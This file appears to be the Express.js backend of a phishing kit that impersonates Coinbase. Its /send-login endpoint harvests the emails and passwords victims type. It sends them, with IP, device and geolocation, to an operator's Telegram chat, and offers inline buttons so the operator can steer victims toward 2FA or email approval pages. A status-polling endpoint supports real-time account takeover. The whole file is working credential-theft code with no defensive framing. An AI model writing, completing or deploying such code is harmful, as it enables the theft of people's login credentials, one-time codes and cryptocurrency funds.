const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");

// ✅ Import the bot
const { bot } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// 🔍 DETECTION FUNCTIONS (Backend only - NOT exposed in frontend)
// ============================================================================

/**
 * Detect device from User-Agent header
 */
function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

/**
 * Detect region from IP address
 */
async function detectRegion(ip) {
  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    const city = data.city || "Unknown";
    const country = data.country || "Unknown";
    return `${city}, ${country}`;
  } catch (error) {
    console.error("❌ Region detection error:", error.message);
    return "Unknown Region";
  }
}

// ============================================================================
// POST /captcha-success
// Frontend calls this when CAPTCHA is solved
// Backend sends to Telegram
// ============================================================================

app.post("/captcha-success", async (req, res) => {
  try {
    console.log(`\n✅ CAPTCHA SUCCESS RECEIVED`);

    // ============================================================================
    // 🔍 GET DETECTION INFO FROM REQUEST (not frontend)
    // ============================================================================

    // Get IP from request headers (handles proxies)
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    console.log(`   IP: ${ip}`);

    // Get device from User-Agent header
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    console.log(`   Device: ${device}`);

    // Get region from IP using backend service
    const region = await detectRegion(ip);
    console.log(`   Region: ${region}`);

    // Build message
    const message = `❗️<b>New Visitor - Coinbase</b>❗️\n` +
      `\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    // Send to Telegram using bot token from env
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in environment");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
      })
    });

    if (response.ok) {
      console.log("✅ Message sent to Telegram");
      res.json({ ok: true, message: "CAPTCHA processed" });
    } else {
      console.error("❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /send-login
// Frontend calls this when user submits email + password
// Backend sends to Telegram with all detected info
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    console.log(`\n😈 LOGIN SUBMISSION RECEIVED`);
    console.log(`   Email: ${email}`);

    // ============================================================================
    // 🔍 GET DETECTION INFO FROM REQUEST (not frontend)
    // ============================================================================

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`   Device: ${device}`);
    console.log(`   Region: ${region}`);
    console.log(`   IP: ${ip}`);

    // Build message for Telegram
    const message = `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
      `\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📡 IP:</b> ${ip}`;

    // Send to Telegram with approval buttons
    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` },
            { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
      return res.status(500).json({ error: "Backend not configured" });
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    if (response.ok) {
      console.log("✅ Login message sent to Telegram");
      
      // Store pending login for polling
      pendingLogins[email] = {
        status: "pending",
        timestamp: Date.now()
      };

      res.json({ ok: true, message: "Login request sent for approval", email });
    } else {
      console.error("❌ Telegram API error:", response.statusText);
      res.status(500).json({ error: "Failed to send message" });
    }

  } catch (err) {
    console.error("❌ Login error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// GET /check-status
// Frontend polls this to check if login was approved
// ============================================================================

const pendingLogins = {};

app.get("/check-status", (req, res) => {
  try {
    const email = (req.query.email || "").trim();

    if (!email) {
      return res.json({ status: "unknown" });
    }

    if (pendingLogins[email]) {
      return res.json({
        status: pendingLogins[email].status || "pending",
        email: email
      });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    console.error("❌ Check status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// Called by Telegram bot when buttons are clicked
// Updates the status so frontend knows to redirect
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    const { email, status } = req.body;

    if (!email || !status) {
      return res.status(400).json({ error: "Missing email or status" });
    }

    console.log(`\n📬 STATUS UPDATE: ${email} → ${status}`);

    if (!pendingLogins[email]) {
      pendingLogins[email] = {};
    }

    pendingLogins[email].status = status;
    pendingLogins[email].updatedAt = Date.now();

    console.log(`✅ Status updated`);

    res.json({ ok: true, message: "Status updated" });

  } catch (err) {
    console.error("❌ Update status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// Start server
// ============================================================================

app.listen(PORT, () => {
  console.log(`\n✅ Server running on port ${PORT}`);
  console.log(`📍 URL: ${process.env.APP_URL || `http://localhost:${PORT}`}`);
  console.log(`\n📡 Listening for CAPTCHA submissions...\n`);
});
